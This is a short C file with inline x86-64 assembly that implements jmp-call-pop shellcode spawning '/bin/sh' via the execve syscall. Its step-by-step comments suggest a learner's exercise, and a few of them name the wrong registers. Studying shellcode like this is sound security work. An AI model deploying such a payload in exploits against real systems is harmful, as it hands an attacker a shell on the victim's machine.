#include <stdio.h>

void main(){


	__asm__(
		"jmp call_label;" //jump to call
		"pop_label:		;"
		"popq %rbx;" //call wil jump to here, making eip the addr of string, which will be on the stack so I can just pop it - esi now has address of bin/sh string.
		"movq %rbx,0x8(%rbx);" //move the address to 8 bytes after whatever rbx is pointing to it's pointing to a string with 7 chars with one \0 char at the end so 8 bytes in total
		"movb $0x0,0x7(%rbx);" //make the last byte 0 just in case
		"movq $0x0,0x10(%rbx);" // so we have 8 bytes of string, and 8 bytes of address in total the offset is 16 bytes for the NULL val that we need to pass to execve
		"movl $0x0,%edx;" // edx needs to have 0x0 for execve (look at __execve in gdb for shell.c)
		"leaq 0x8(%rbx),%rsi;" //rsi needs to contain the address that points to the address of the string of the file name followed by NULL ptr
		"movq %rbx,%rdi;" //rdi needs to contain the address of the string
		//now for execve i need to mov 0x3b in to eax and do a syscall
		"movl $0x3b,%eax;"
		"syscall;"
		//for exit i need to mov 0x3c into eax and do a syscall
		"movl $0x3c,%eax;"
		"syscall;"
		"call_label:	;"
		"call pop_label;" // this is exactly like calling a function, this pshes the next ip to the stack which in our case is just a pointer to this string
		".asciz \"/bin/sh\";"
		);
}
